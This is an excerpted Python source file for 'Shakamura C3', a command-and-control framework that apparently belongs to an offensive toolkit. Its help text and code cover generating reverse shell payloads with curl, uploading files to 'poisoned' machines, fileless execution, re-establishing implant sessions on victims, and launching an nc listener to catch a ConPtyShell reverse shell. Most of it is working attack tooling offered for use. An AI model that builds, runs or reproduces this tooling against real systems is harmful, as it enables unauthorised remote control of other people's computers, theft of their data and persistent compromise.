...
from Core.settings import Shakamura_Settings, Core_Server_Settings, TCP_Sock_Handler_Settings, File_Smuggler_Settings, Loading
...
parser.add_argument("-x", "--afric-port", action="store", help = "Shakamura server port (default: 8080 via http, 443 via https).", type = int)
...
parser.add_argument("-i", "--insecure", action="store_true", help = "Allows any Shakamura client (sibling server) to connect to your instance without prompting you for verification.")
parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate (for Shakamura https server).")
parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate (for Shakamura https server).")
...
Shakamura_Settings.certfile = args.certfile
Shakamura_Settings.keyfile = args.keyfile
Shakamura_Settings.ssl_support = True if (args.certfile and args.keyfile) else False
Shakamura_Settings.bind_port = args.afric_port if args.afric_port else Shakamura_Settings.bind_port

if Shakamura_Settings.ssl_support:
    Shakamura_Settings.bind_port_ssl = args.afric_port if args.afric_port else Shakamura_Settings.bind_port_ssl
...
if Shakamura_Settings.ssl_support:
    defined_ports.append(Shakamura_Settings.bind_port_ssl)
else:
    defined_ports.append(Shakamura_Settings.bind_port)
...
# Import Core    
from Core.shakamura_core import *
...
def print_meta():
    print(f'{BLUE}   ~[ Shakamura C3 - Part of africana-framework ]~{END}')
...
connect <IP> <TEAM_SERVER_PORT>''',
        ...
        'generate' : {
            'details' : f'''         
Generate a reverse shell command. This function has been redesigned to use payload templates, which you can find in Shakamura/Core/payload_templates and edit or create your own.
...
generate payload=linux/shakamura/sh_curl lhost=eth0
...
- To catch Shakamura https-based reverse shells you need to start Shakamura with SSL.
...
*Command(s) should be quoted.''',
        ...
        'repair' : {
            'details' : f'''             
Use this command to manually correct a backdoor session's hostname/username value, in case Shakamura does not interpret the information correctly when the session is established.
...
Siblings are basically other instances of Shakamura that you are connected with.''',
            'least_args' : 0,
            'max_args' : 0
        },
...
Note that, if the thread limiter reaches 0, weird things will start happening as new threads (e.g. backdoor sessions) will be queued until: thread limiter > 0.''',
        ...
        'sockets' : {
            'details' : f'''Prints Shakamura related socket services info.''',
            'least_args' : 0,
            'max_args' : 0
        },
        ...
        'upload' : {
            'details' : f'''
Upload files to a poisoned machine (files are auto-requested from the http file smuggler). The feature works regardless if the session is owned by you or a sibling server. You can run the command from Shakamura's main prompt as well as the pseudo shell terminal.
...
upload <LOCAL_FILE_PATH> <REMOTE_FILE_PATH>''',
        ...
        'cmdinspector' : {
            'details' : f'''
Shakamura has a function that inspects user issued shell commands for input that may cause a backdoor shell session to hang (e.g., unclosed single/double quotes or backticks, commands that may start a new interactive session within the current shell and more). 
...
conptyshell <IP or INTERFACE> <PORT> <SESSION ID or ALIAS>''',
        ...
        'flee' : {
            'details' : f'''Quit without terminating active sessions. When you start Shakamura again, if any Shakamura implant is still running on previously injected hosts, the session(s) will be re-established.''',
            'least_args' : 0,
            'max_args' : 0
        },
        ...
        'purge' : {
            'details' : f'''Shakamura automatically stores information regarding generated implants and loads them in memory every time it starts. This way, Shakamura generated implants become reusable and it is possible to re-establish older sessions, assuming the payload is still running on the victim(s). Use this command to delete all session related metadata. It does not affect any active sessions you may have.''',
            'least_args' : 0,
            'max_args' : 0
        },
    ...
    def print_main_help_msg():
        ...
        \r  sockets              Print Shakamura related running services' info.
...
def main():
    ...
    if not args.skip_update:
        ...
        try:
            ...
            branch = 'main' 
            url = f'https://api.github.com/repos/r0jahsm0ntar1/Shakamura/git/trees/{branch}?recursive=1'
            raw_url = f'https://raw.githubusercontent.com/r0jahsm0ntar1/Shakamura/{branch}/'        
            Loading.active = True
                ...
                for filename in files:
                    ...
                    if not local_signature or (local_signature != latest_signature):
                        ...
                        if update_consent:
                            ...
                            if not updated:
                                Loading.stop()
                                print(f'\r[{ERR}] Error while updating files. Installation may be corrupt. Consider reinstalling Shakamura.')
                                exit(1)
    ...
    def shakamura_out(flee = False):
        ...
        if verified:
            ...
            try:
                ...
                Shakamura.terminate() if not flee else do_nothing()
                core.stop_listener()
                ...
                print(f'{BLUE}-[        Shakamura C3 - COM Command & Control        ]- {END}')
                ...
                if cmd == 'help':                    
                                ...
                                if approved:
                                    ...
                                    if session_owner_id == core.return_server_uniq_id():
                                        File_Smuggler.fileless_exec(execution_object, session_id, issuer = 'self') if is_file \
                                            else Shakamura.command_pool[session_id].append(execution_object)
                    ...
                    if Sessions_Manager.active_sessions.keys():
                        ...
                        if not shell_occupied:                    
                            ...
                            Shakamura.activate_pseudo_shell_session(session_id, os_type)
                    ...
                    if sessions_check[0]:
                        ...
                        # Construct Shakamura issued command to request and exec ConPtyShell
                        ...
                        if session_owner_id == core.return_server_uniq_id():
                            ...
                            if verified.lower().strip() in ['y', 'yes']:
                                # Start listener
                                os.system(f'x-terminal-emulator -e bash -c "stty raw -echo; (stty size; cat) | nc -lvnp {lport}"')
                                shakamura_cmd['issuer'] = core.return_server_uniq_id()
                                Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, shakamura_cmd)
